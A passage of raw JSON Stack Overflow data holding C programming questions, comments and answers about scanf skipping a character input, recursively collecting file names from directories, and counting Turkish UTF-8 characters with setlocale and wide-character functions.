printf(\"\\nEingabe Unbekannt\");\n    }\n\n    printf(\"\\n\");\n\n    }\n\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 7032129, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SOBKS.jpg?s=128&g=1", "display_name": "MAXLooW", "link": "https://stackoverflow.com/users/7032129/maxloow"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "accepted_answer_id": 41357346, "answer_count": 3, "score": 0, "last_activity_date": 1482939641, "creation_date": 1482885504, "last_edit_date": 1482885717, "question_id": 41353930, "link": "https://stackoverflow.com/questions/41353930/c-char-scanf-problems", "title": "C - char scanf problems", "body": "<p>I don't know why the code</p>\n\n<p><code>scanf(\"%c\",&amp;eingabe);</code></p>\n\n<p>everytime overleaps.</p>\n\n<p>i try it with getchar too but same problem again.</p>\n\n<p>I use linux but execute the code with xterm.</p>\n\n<p>Anyone can help me?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int z1,z2,erg=0;\n    char eingabe;\n\n    while(1){\n\n\n    printf(\"Geben Sie die erste Zahl an: \");\n    scanf(\"%d\",&amp;z1); //works\n    fflush(stdin); //clear\n\n    printf(\"\\nGeben Sie die zweite Zahl an: \");\n    scanf(\"%d\",&amp;z2); //works\n    fflush(stdin);//clear\n\n    erg=z1*z2; //works\n    printf(\"\\n%d * %d = %d\",z1,z2,erg); //works\n\n    printf(\"\\n\");\n    printf(\"#######################\");\n    printf(\"\\n\");\n\n    printf(\"Weiter = W\\n\");\n    printf(\"Stop = P\\n\");\n\n    printf(\"Eingabe: \");\n    scanf(\"%c\",&amp;eingabe); //this is the line with the problem\n    fflush(stdin); //clear\n\n    switch(eingabe){\n        case 'w':\n        system(\"clear\");\n        break;\n        case 'p':\n        system(\"exit\");\n        break;\n        default:\n        printf(\"\\nEingabe Unbekannt\");\n    }\n\n    printf(\"\\n\");\n\n    }\n\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "recursion", "struct", "directory"], "comments": [{"owner": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "edited": false, "score": 1, "creation_date": 1482885461, "post_id": 41353876, "comment_id": 69909804, "body": "<code>i++; scanDir(dp-&gt;d_name, file, i);</code> - this can&#39;t possibly work. It will overwrite the results of the recursive call in the next iteration of the main loop, as  you use the same value of <code>i</code> in the recursive call and in the next iteration. You should make <code>i</code> an <code>int *</code> to keep track of the current cursor position across recursive calls, or make it a global, or have scanDir() return the new cursor offset. Also, the recursive call should be conditional on <code>dp-&gt;d_name</code> being a directory. Hint: look at <code>stat(2)</code> to determine if a <code>dirent</code> is a directory."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1482950652, "post_id": 41353876, "comment_id": 69937380, "body": "this seems to be a duplicate of &lt;<a href=\"http://stackoverflow.com/questions/612097/how-can-i-get-the-list-of-files-in-a-directory-using-c-or-c\" title=\"how can i get the list of files in a directory using c or c\">stackoverflow.com/questions/612097/&hellip;</a>&gt; and &lt;<a href=\"http://stackoverflow.com/questions/4204666/how-to-list-files-in-a-directory-in-a-c-program\" title=\"how to list files in a directory in a c program\">stackoverflow.com/questions/4204666/&hellip;</a>&gt;  and &lt;<a href=\"http://stackoverflow.com/questions/11736060/how-to-read-all-files-in-a-folder-using-c\" title=\"how to read all files in a folder using c\">stackoverflow.com/questions/11736060/&hellip;</a>&gt;"}], "owner": {"reputation": 1, "user_id": 5574415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/74a77d8f39adf45eb10d870181c15112?s=128&d=identicon&r=PG&f=1", "display_name": "fulladder", "link": "https://stackoverflow.com/users/5574415/fulladder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 98, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1482885037, "creation_date": 1482885037, "question_id": 41353876, "link": "https://stackoverflow.com/questions/41353876/read-the-directory-and-add-the-filename-into-the-struct-array-recursively", "title": "Read the directory and add the filename into the struct array recursively", "body": "<pre><code>typedef struct file{/*This is the struct to add*/\n    char* fileNames;\n}File;\nFile* scanDir(char *path,File file[],int i){/*Func works recursively*/\n    DIR *dir;\n\n    struct dirent *dp;\n\n    char * file_name;\n    dir = opendir(path);\n    if(dir==NULL)\n        return file;\n    chdir(path);\n    while ((dp=readdir(dir)) != NULL) {\n        if (!strcmp(dp-&gt;d_name, \".\") || !strcmp(dp-&gt;d_name, \"..\")){}\n        else {\n            file_name = dp-&gt;d_name; /*use it*/\n            printf(\"file_name: \\\"%s\\\"\\n\",file_name);\n            file[i]=create(file_name,file[i]);/*This create function adds the file name into the file struct*/\n            i++;\n            scanDir(dp-&gt;d_name,file,i);\n\n        }\n    }\n    chdir(\"..\");\n    closedir(dir);\n    return file;\n}\n</code></pre>\n\n<p>I am trying to add file names to struct array. int i counts the array order.\nHow can I read the files by adding to struct array?</p>\n"}, {"tags": ["c", "count", "character-encoding"], "comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482884762, "post_id": 41353844, "comment_id": 69909667, "body": "You need an unicode library that handle UTF8/UTF16/UTF32."}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 1, "creation_date": 1482884812, "post_id": 41353844, "comment_id": 69909674, "body": "... And check that you can open the file"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482884836, "post_id": 41353844, "comment_id": 69909683, "body": "How can i fix then? @stargateur"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "reply_to_user": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482884882, "post_id": 41353844, "comment_id": 69909694, "body": "my file include &quot;\u011f,&#252;,&#231;,\u0131,&#246;&quot; characters @EdHeal but doesn&#39;t calculate them."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482885024, "post_id": 41353844, "comment_id": 69909714, "body": "@jekyll Do some search yourself, <a href=\"http://stackoverflow.com/questions/313555/light-c-unicode-library\" title=\"light c unicode library\">stackoverflow.com/questions/313555/light-c-unicode-library</a>."}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482885035, "post_id": 41353844, "comment_id": 69909716, "body": "You would need <code>wchar_t</code> for reading"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "reply_to_user": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482885201, "post_id": 41353844, "comment_id": 69909749, "body": "@EdHeal thank you, but i don&#39;t know how it use this function. i&#39;ll search thanks again. i will change the whole code? :("}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482885240, "post_id": 41353844, "comment_id": 69909762, "body": "It is a data type"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "reply_to_user": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482885563, "post_id": 41353844, "comment_id": 69909825, "body": "i added this @EdHeal <code>#include &lt;wchar.h&gt;</code>     <code>wchar_t string[9000];</code> and i i got error this line :   <code>if ( fgets(string, 9000, plain) != NULL) {         puts(string);</code>"}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482885702, "post_id": 41353844, "comment_id": 69909852, "body": "Perhaps this would help <a href=\"http://www.cplusplus.com/reference/cwchar/fgetws/\" rel=\"nofollow noreferrer\">cplusplus.com/reference/cwchar/fgetws</a> or <a href=\"https://linux.die.net/man/3/fgetws\" rel=\"nofollow noreferrer\">linux.die.net/man/3/fgetws</a>"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "reply_to_user": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482885973, "post_id": 41353844, "comment_id": 69909912, "body": "@EdHeal i fix it thanks but still doesnt count my characters :(   <code>if ( fgetws(string, 9000, plain) != NULL) {         fputws(string, plain);</code>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1482886741, "post_id": 41353844, "comment_id": 69910045, "body": "Did you check and print the return value from <code>setlocale()</code>?  Is <code>&quot;turkish&quot;</code> a valid locale string?  (I use <code>en_US.UTF-8</code> by default: I&#39;d expect you to be using a code such as <code>tr_TR.UTF-8</code> or <code>tr-TR.ISO8859-9</code> or something vaguely similar \u2014 both those locales exist on macOS Sierra, at least on my machine.)"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482886963, "post_id": 41353844, "comment_id": 69910076, "body": "@JonathanLeffler thanks for reply, i changed this line <code>setlocale(LC_ALL,&quot;en_US.UTF-8&quot;);</code> and i tried your suggestions but i still calculate just english characters :((( &quot;\u011f&quot; didn&#39;t count it."}, {"owner": {"user_type": "does_not_exist", "display_name": "user539810"}, "edited": false, "score": 0, "creation_date": 1482887960, "post_id": 41353844, "comment_id": 69910241, "body": "I know Windows in the past used locale names like <code>Turkish_Turkey.1254</code> instead of something like <code>tr_TR.ISO8859-9</code>, though more recent editions allow you to use <code>tr-TR.1254</code>. Please edit your question to include both the system you&#39;re executing the code on and the character encoding of your file, so we can provide more accurate answers. If you&#39;re uncertain of the characer encoding, you can upload the file to a <a href=\"https://nlp.fi.muni.cz/projects/chared/\" rel=\"nofollow noreferrer\">character encoding detector</a> to obtain this information."}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "reply_to_user": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482887978, "post_id": 41353844, "comment_id": 69910244, "body": "if change the this line maybe problem solves. <code>( string[c] &gt;= &#39;a&#39; &amp;&amp; string[c] &lt;= &#39;z&#39; )</code> any ideas? because program just see english characters in this line. @EdHeal @JonathanLeffler"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482888089, "post_id": 41353844, "comment_id": 69910262, "body": "@ChronoKitsune thanks for reply, my file character encoding: Detected by Chared: utf_8"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1482898775, "post_id": 41353844, "comment_id": 69912327, "body": "The <code>en_US.UTF-8</code> string is for US English; <code>en_GB.UTF-8</code> for British English; both use the UTF-8 code set.  Note that your test using <code>if (string[c] &gt;= &#39;a&#39; &amp;&amp; string[c] &lt;= &#39;z&#39;)</code> only detects unaccented letters in the basic ASCII (lower-case) range. You&#39;d need to use <code>isalpha()</code> from <code>&lt;ctype.h&gt;</code> to detect alphabetic characters outside the basic ASCII range. You then have to map those to appropriate indexes to count them properly. This is some of what Chrono Kitsune does with their answer. It is hard work dealing with such characters. Knowing the code set (which you found is UTF-8) is crucial."}], "answers": [{"comments": [{"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482885608, "post_id": 41353899, "comment_id": 69909832, "body": "so i added this <code>#include &lt;wchar.h&gt;</code>     <code>wchar_t string[9000];</code> and i i got error this line :   <code>if ( fgets(string, 9000, plain) != NULL) {         puts(string);</code> still doesn&#39;t work."}, {"owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "reply_to_user": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482885662, "post_id": 41353899, "comment_id": 69909844, "body": "And what is the character encoding of your file?"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482885728, "post_id": 41353899, "comment_id": 69909856, "body": "<code>setlocale(LC_ALL,&quot;turkish&quot;);</code> @LudwigSchulze"}, {"owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "reply_to_user": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 2, "creation_date": 1482885865, "post_id": 41353899, "comment_id": 69909895, "body": "Absolutely not! What is the output of &quot;file plaintext.txt&quot;"}, {"owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "reply_to_user": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 1, "creation_date": 1482886341, "post_id": 41353899, "comment_id": 69909974, "body": "No way! I&#39;m not asking for the file&#39;s contents, but for its character encoding. Read <a href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-9\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/ISO/IEC_8859-9</a>, <a href=\"https://en.wikipedia.org/wiki/UTF-8\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/UTF-8</a>, and learn your problem domain!"}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482888393, "post_id": 41353899, "comment_id": 69910316, "body": "my file character encoding: utf_8 @LudwigSchulze"}, {"owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "reply_to_user": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482888909, "post_id": 41353899, "comment_id": 69910424, "body": "Is this a guess or do you know for sure? How have you found out it&#39;s utf-8? Because, for accurate counting, you have to be 100% sure what the character encoding of the file is. Note that you can have files with very different character encodings on the same system."}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482889749, "post_id": 41353899, "comment_id": 69910572, "body": "not guess, i&#39;m sure %100 because i checked it here: <a href=\"https://nlp.fi.muni.cz/projects/chared/\" rel=\"nofollow noreferrer\">link</a>"}, {"owner": {"reputation": 18759, "user_id": 2226988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6fbec3a71b2e95e4a6e41478deb379?s=128&d=identicon&r=PG", "display_name": "Tom Blodget", "link": "https://stackoverflow.com/users/2226988/tom-blodget"}, "reply_to_user": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482968112, "post_id": 41353899, "comment_id": 69944135, "body": "@jekyll The encoding of a file is chosen by the writer. Detection is guessing with rules and probabilities. <i>The writer has the responsibility of ensuring the reader knows the encoding.</i> (If someone is providing you the files, you should just ask.) So, you might know that it is UTF-8 and saying that a detection tool agrees supports that claim but if you are only using the tool it still just a guess and in many cases one sample of a file is consistent with many encoding but perhaps not in a future version of the file."}], "tags": [], "owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "is_accepted": false, "score": 0, "last_activity_date": 1482885533, "last_edit_date": 1482885533, "creation_date": 1482885211, "answer_id": 41353899, "question_id": 41353844, "link": "https://stackoverflow.com/questions/41353844/counting-turkish-character-in-c/41353899#41353899", "title": "Counting Turkish character in C", "body": "<p>The solution depends on the character encoding of your files.</p>\n\n<p>If the file is in ISO 8859-9 (latin-5), then each special character is still encoded in a single byte, and you can modify your code easily: You already have a distiction between upper case and lower case. Just add more branches for the special characters.</p>\n\n<p>If the file is in UTF-8, or some other unicode encoding, you need a multi-byte capable string library.</p>\n"}, {"comments": [{"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482887197, "post_id": 41354046, "comment_id": 69910118, "body": "Thanks for reply, i tried this <code>setlocale(LC_ALL, &quot;tr_TR.UTF-8&quot;)</code> but still calculate just english characters. I can&#39;t see why this does not work."}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482887473, "post_id": 41354046, "comment_id": 69910161, "body": "thanks but this it will change whole code? i don&#39;t know how it work this functions strcoll() and others, i&#39;ll search it. Thanks."}, {"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "reply_to_user": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482889551, "post_id": 41354046, "comment_id": 69910538, "body": "Yes, you will have to change your program rather substantially to support UTF-8 text."}], "tags": [], "owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "is_accepted": false, "score": 2, "last_activity_date": 1482887144, "last_edit_date": 1482887144, "creation_date": 1482886823, "answer_id": 41354046, "question_id": 41353844, "link": "https://stackoverflow.com/questions/41353844/counting-turkish-character-in-c/41354046#41354046", "title": "Counting Turkish character in C", "body": "<pre><code>setlocale(LC_ALL,\"turkish\");\n</code></pre>\n\n<p>First: <code>\"turkish\"</code> isn't a locale.</p>\n\n<p>The proper name of a locale will typically look like <code>xx_YY.CHARSET</code>, where <code>xx</code> is the <a href=\"https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes\" rel=\"nofollow noreferrer\">ISO 639-1</a> code for the language, <code>YY</code> is the <a href=\"https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes\" rel=\"nofollow noreferrer\">ISO 3166-1 Alpha-2 code</a> for the country, and <code>CHARSET</code> is an optional character set name (usually <code>ISO8859-1</code>, <code>ISO8859-15</code>, or <code>UTF-8</code>). Note that not all combinations are valid; the computer must have locale files generated for that specific combination of language code, country code, and character set.</p>\n\n<p>What you probably want here is <code>setlocale(LC_ALL, \"tr_TR.UTF-8\")</code>.</p>\n\n<hr>\n\n<pre><code>if ( string[c] &gt;= 'a' &amp;&amp; string[c] &lt;= 'z' ){\n</code></pre>\n\n<p>Second: Comparison operators like <code>&gt;=</code> and <code>&lt;=</code> are not locale-sensitive. This comparison will always be performed on bytes, and will not include characters outside the ASCII <code>a</code>-<code>z</code> range.</p>\n\n<p>To perform a locale-sensitive comparison, you must use a function like <code>strcoll()</code>. However, note additionally that some letters (including the ones you're trying to include here!) are composed of multi-byte sequences in UTF-8, so looping over bytes won't work either. You will need to use a function like <code>mblen()</code> or <code>mbtowc()</code> to separate these sequences.</p>\n"}, {"comments": [{"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482917772, "post_id": 41354396, "comment_id": 69919782, "body": "thank you, i&#39;m on Linux (Mac OS X) and using Xcode. First i added this line  <code>wchar_t string[9000];</code> and  <code>if ( fgetws(string, 9000, plain) != NULL) { fputws(string, plain);}</code> no problem here. i added your codes above, but if i do not write this code all lines gets error : <code>if (setlocale(LC_CTYPE, &quot;en_US.UTF-8&quot;)) != NULL) { abort();}</code> error is: expected expression. if i delete this then i got errors:<code>count[chptr-1]++;</code> <i>*Array subscript is not an integer. ** and i got error this lines too: <code>chptr -= (lower-1);</code> incompatible integer to pointer conversion const wchar_t</i> (aka const int*)from long"}, {"owner": {"user_type": "does_not_exist", "display_name": "user539810"}, "reply_to_user": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482937585, "post_id": 41354396, "comment_id": 69930688, "body": "@jekyll I amended my answer. The <code>setlocale</code> line had an extra closing parentheses, and I&#39;ve hopefully fixed everything else you mentioned."}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482944632, "post_id": 41354396, "comment_id": 69934506, "body": "thank you, actually i found another way but this time my output is octal :D  \\347 0.006665 :D :))) \\347 is &#231;."}, {"owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482952858, "post_id": 41354396, "comment_id": 69938360, "body": "Thank you i got it. I wondered 